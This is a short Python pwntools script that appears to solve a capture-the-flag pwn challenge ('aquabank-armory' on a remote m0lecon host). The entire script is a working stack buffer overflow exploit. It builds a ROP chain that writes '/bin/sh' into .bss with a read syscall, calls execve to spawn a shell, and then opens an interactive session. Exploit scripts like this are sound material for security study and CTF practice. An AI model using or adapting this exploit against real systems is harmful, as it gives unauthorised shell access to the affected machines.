from pwn import *

context.binary = elf = ELF('./aquabank-armory', checksec=False)

# p = process('./aquabank-armory')
p = remote('offsec.m0lecon.it', 13537)
OFFSET_TO_RIP = 72

pop_rdi = elf.sym.pop_rdi_ret
pop_rsi = elf.sym.pop_rsi_ret
pop_rdx = elf.sym.pop_rdx_ret
syscall_ret = elf.sym.syscall_ret

rop = ROP(elf)
pop_rax = rop.find_gadget(['pop rax', 'ret']).address#0x00000000004214eb

# i will write the string "/bin/sh" in the .bss section, and then call execve("/bin/sh", NULL, NULL) using the syscall gadget.
# to write, i will simply call a read syscall. i can do this because i have the rax control, so i can set rax to 0 (sys_read) 
# and then call the syscall gadget.
bss_addr = elf.bss() 

payload = flat(
    b'A' * OFFSET_TO_RIP,

    p64(pop_rdi), p64(0),
    p64(pop_rsi), p64(bss_addr),
    p64(pop_rdx), p64(8), # 8 bytes length
    p64(pop_rax), p64(0), # syscall 0: read
    p64(syscall_ret),

    # execve what is inside the bss section
    p64(pop_rdi), p64(bss_addr),
    p64(pop_rsi), p64(0),
    p64(pop_rdx), p64(0),
    p64(pop_rax), p64(59),
    p64(syscall_ret)
)

p.recvuntil(b'weapons:')
p.sendline(payload)
p.send(b'/bin/sh\x00')

p.interactive()
